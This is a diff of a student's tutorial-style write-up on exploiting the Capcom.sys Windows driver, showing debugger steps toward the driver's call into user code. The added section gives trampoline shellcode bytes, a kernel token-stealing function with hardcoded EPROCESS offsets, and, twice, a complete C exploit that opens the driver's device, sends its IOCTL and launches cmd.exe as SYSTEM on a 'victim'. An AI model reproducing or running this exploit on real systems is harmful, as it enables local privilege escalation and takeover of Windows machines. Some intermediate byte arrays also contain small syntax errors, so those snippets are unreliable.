@@ -1,4 +1,4 @@
-<img width="948" height="69" alt="image" src="https://github.com/user-attachments/assets/a4a17b5a-ef86-4e93-bae0-56e53be60e91" /># Capcom.sys : The driver that disables SMEP.
+# Capcom.sys : The driver that disables SMEP.
 
 - I tried my best to make the poc as simple as possible, it's no more than 40 lines. Could be found here.
 - I am still a student, mistakes are possible.
@@ -432,12 +432,212 @@ We have passed the cmp instruction :
 
 <img width="1890" height="597" alt="image" src="https://github.com/user-attachments/assets/e5dffe8e-72e8-4c3a-8487-985d3707ccd0" />
 
-We should now keep stepping instructions until we reach the call instruction without any issues, the one being the call to our input (Which according to the image is now in rsp var_20) :
+We should now keep stepping instructions until we reach the call instruction(s) without any issues, the one being the call to our input (Which according to the image is now in rsp var_20) :
 
-<img width="819" height="381" alt="image" src="https://github.com/user-attachments/assets/d2a124eb-6068-43d1-8aad-fd78671fc1ce" />
+<img width="999" height="546" alt="image" src="https://github.com/user-attachments/assets/dd261b2b-3d0e-4b0c-92f7-3a8a28bc2919" />
 
-The call instruction being `call rax` which will call and execute our "shellcode" :
+The call instruction being `call qword ptr [rsp+28h]` which will call and execute our "shellcode" (since rax now holdsour SMEP_Disable function) :
+
+<img width="1153" height="665" alt="image" src="https://github.com/user-attachments/assets/48679b79-ffe6-4ce4-b38d-eb7dbbf742c7" />
+
+Now that we are at `call qword ptr [rsp+28h]`, we should our shellcode to start executing after pressing `p` in the cli :
+
+<img width="930" height="455" alt="image" src="https://github.com/user-attachments/assets/f0bfe560-dd11-4d6e-8a52-f8b0845bc9cd" />
+
+We have now achieved "Code execution", Because if we now press go, the system will run until the next 0xCC. 
+
+<img width="706" height="674" alt="image" src="https://github.com/user-attachments/assets/8bf467c3-d4fd-4f18-a477-1a3fdb99d27d" />
+
+Now is the best time to start working on the shellcode which will lead to a Local Privilege escalation.
+
+Recall from our POC that we have this line : `*(PULONG_PTR)(buffer) = (ULONG_PTR)(buffer + 8);`
+
+We are allocating 8 bytes, which will point to the start of the shellcode (you might need to scroll a bit up to understand incase you forgot). So the first 8 bytes of our code will be :
+
+```cpp
+{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
+```
+Since it will automatically fill up.
+
+Then, we need to call the second 8 bytes, which will contain the token stealing shellcode. And to call that, we will need to call 8 bytes after the current position, which should look something like this in assembly :
+
+`call $+8`
+
+In shellcode, it will look like this (you can use msf nasm shell to do it too) :
+
+```
+{0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00     // Will be filled up by the pointer to the start of the shellcode
+ 0xE8, 0x08, 0x00, 0x00, 0x00                       // calling RIP + 8
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00      // pointer to token stealing function
+}
+```
+
+Now we are almost done, we only need to jmp to rax, but since RIP/EIP just jumped over those 8 bytes, we can do `pop rax`, which will drop a pointer to our buffer that contains the area of memory we are currently in.
+
+So pop rax is 0x58 in hex. And then to jump to the shellcode, we will jump to the thing that was pointed to by rax by dereferencing it, being jmp [rax]. Which is 0xff 0x20:
+
+```cpp
+{
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // Will be filled up by the pointer to the start of the shellcode
+ 0xE8, 0x08, 0x00, 0x00, 0x00                       // calling RIP + 8
+0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,     // pointer to token stealing function
+0x58,                                               // POP RAX, will drop a pointer into the 8 bytes above
+0xFF, 0x20                                          // JMP [RAX], jumping to what rax is pointing to
+}
+```
+
+Now that we have the shellcode, let's add it to our code : 
+
+<img width="524" height="83" alt="image" src="https://github.com/user-attachments/assets/bb4c68ad-92ec-4d58-abfc-9095728cc332" />
 
 
+And let's also edit this part : 
 
+```cpp
+	*(PULONG_PTR)(buffer) = (ULONG_PTR)(buffer + 8);
+	*(PULONG_PTR)(buffer + 8) = 0xCC90CC90CC90CC90;
+	ULONG_PTR point = (ULONG_PTR)(buffer + 8);
+```
+
+to become buffer + 13, since the next 8 bytes is after calling RIP + 8 :
+
+```cpp
+	*(PULONG_PTR)(buffer) = (ULONG_PTR)(buffer + 8);
+	*(PULONG_PTR)(buffer + 13) = (ULONG_PTR)"shellcode_PlaceHolder";
+	ULONG_PTR point = (ULONG_PTR)(buffer + 13);
+```
+one more thing since we have now active shellcode, we will need to move this shellcode into the variable that holds "VirtualAlloc" : 
+
+`memcpy(buffer, t, 24);`
+
+Now, that we know that 0xCC90CC90CC90CC90 executes, it's now time to create our token stealing function, which will will take the token from the SYSTEM process and then proceed to transfer it to a variable that will hold it. Here is how it will look like :
+
+```cpp
+__declspec(noinline) void steal(void* x) {
+    uint64_t me  = *(uint64_t*)(__readgsqword(0x188) + 0x220);
+    uint64_t sys = me;
+    do { sys = *(uint64_t*)(sys + 0x448) - 0x448; }
+    while (*(uint64_t*)(sys + 0x440) != 4);
+    *(uint64_t*)(me + 0x4b8) = *(uint64_t*)(sys + 0x4b8);
+}
+```
+This should like simple, but '__readgsqword' and the function initializtion is what might look weird.
+
+`__declspec(noinline)` tells the compiler to not inline this function, and keep is as a real function with a real address.
+`__readgsqword(0x188)` asks the CPU, who is this current thread ? And then returns KTHREAD.
+
+Adding the value of this `__readgsqword(0x188)` by 0x220, gives us the _KPROCESS, which is the base of the EPROCESS we are looking for :
+
+<img width="575" height="328" alt="image" src="https://github.com/user-attachments/assets/ae1ba0cb-6c9b-4152-8901-ca8a9b9bd732" />
+
+Which means, the token will reside at 0x4b8 more :
+
+<img width="337" height="63" alt="image" src="https://github.com/user-attachments/assets/8e30f3cd-f99e-4747-a68b-8b04dada8397" />
+
+with that information in mind, we can now look at our final look of our code :
+
+<img width="812" height="737" alt="image" src="https://github.com/user-attachments/assets/cea0867e-def8-4c0a-8238-d5561c6881d6" />
+
+I will paste what it looks like here :
+
+```cpp
+#include <Windows.h>
+#include <stdint.h>
+#include <stdio.h>
+
+#define IOCTL 0xAA013044
+HANDLE hDevice;
+
+__declspec(noinline) void steal(void* x) {
+    uint64_t me = *(uint64_t*)(__readgsqword(0x188) + 0x220);
+    uint64_t sys = me;
+    do { sys = *(uint64_t*)(sys + 0x448) - 0x448; } while (*(uint64_t*)(sys + 0x440) != 4);
+    *(uint64_t*)(me + 0x4b8) = *(uint64_t*)(sys + 0x4b8);
+}
+
+int main() {
+    hDevice = CreateFileA("\\\\.\\Htsysm72FB",
+        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    if (hDevice == INVALID_HANDLE_VALUE) {
+        printf("[-] Device open failed: %d\n", GetLastError()); return 1;
+    }
+    printf("[+] Device opened\n");
+
+    BYTE t[] = { 0,0,0,0,0,0,0,0,         //  Capcom jumps here : b+8
+                 0xE8,8,0,0,0,             // CALL +8
+                 0,0,0,0,0,0,0,0,          // steal() 
+                 0x58,0xFF,0x20 };         // POP RAX; JMP [RAX]
+
+    PBYTE buffer = VirtualAlloc(NULL, 24, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!buffer) { printf("[-] VirtualAlloc failed: %d\n", GetLastError()); return 1; }
+
+    memcpy(buffer, t, 24);                              // copy trampoline bytes
+    *(uint64_t*)(buffer + 0x00) = (uint64_t)(buffer + 8);// [0x00] b+8
+    *(uint64_t*)(buffer + 0x0D) = (uint64_t)steal;     // [0x0D] = 13 - steal()
+
+    printf("[+] Trampoline at  : %p\n", buffer);
+    printf("[+] steal() at     : %p\n", steal);
+
+    uint64_t point = (uint64_t)(buffer + 8);
+    DWORD out = 0, br = 0;
+    BOOL result = DeviceIoControl(hDevice, IOCTL, &point, 8, &out, 4, &br, NULL);
+    if (!result) { printf("[-] IOCTL failed: %d\n", GetLastError()); return 1; }
+    printf("[+] IOCTL succeeded — token stolen\n");
+```
+
+Now, one thing is missing, which is starting a process with admin permissions. 
+
+We can do that using system("cmd.exe");
+
+```cpp
+#include <Windows.h>
+#include <stdint.h>
+#include <stdio.h>
+
+#define IOCTL 0xAA013044
+HANDLE hDevice;
+
+__declspec(noinline) void steal(void* x) {
+    uint64_t me = *(uint64_t*)(__readgsqword(0x188) + 0x220);
+    uint64_t sys = me;
+    do { sys = *(uint64_t*)(sys + 0x448) - 0x448; } while (*(uint64_t*)(sys + 0x440) != 4);
+    *(uint64_t*)(me + 0x4b8) = *(uint64_t*)(sys + 0x4b8);
+}
+
+int main() {
+    hDevice = CreateFileA("\\\\.\\Htsysm72FB",
+        GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    if (hDevice == INVALID_HANDLE_VALUE) {
+        printf("[-] Device open failed: %d\n", GetLastError()); return 1;
+    }
+    printf("[+] Device opened\n");
+
+    BYTE t[] = { 0,0,0,0,0,0,0,0,         //  Capcom jumps here : b+8
+                 0xE8,8,0,0,0,             // CALL +8
+                 0,0,0,0,0,0,0,0,          // steal() 
+                 0x58,0xFF,0x20 };         // POP RAX; JMP [RAX]
+
+    PBYTE buffer = VirtualAlloc(NULL, 24, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!buffer) { printf("[-] VirtualAlloc failed: %d\n", GetLastError()); return 1; }
+
+    memcpy(buffer, t, 24);                              // copy trampoline bytes
+    *(uint64_t*)(buffer + 0x00) = (uint64_t)(buffer + 8);// [0x00] b+8
+    *(uint64_t*)(buffer + 0x0D) = (uint64_t)steal;     // [0x0D] = 13 steal()
+
+    printf("[+] Trampoline at  : %p\n", buffer);
+    printf("[+] steal() at     : %p\n", steal);
+
+    uint64_t point = (uint64_t)(buffer + 8);
+    DWORD out = 0, br = 0;
+    BOOL result = DeviceIoControl(hDevice, IOCTL, &point, 8, &out, 4, &br, NULL);
+    if (!result) { printf("[-] IOCTL failed: %d\n", GetLastError()); return 1; }
+    printf("[+] IOCTL succeeded — token stolen\n");
+
+    system("cmd.exe");
+}
+```
+
+using my compiler `cl start.c` and transfering it to my victim, we spawn a system shell :
+
+<img width="518" height="320" alt="image" src="https://github.com/user-attachments/assets/1b267ddd-881f-4e54-a405-b392bac5df2b" />
 
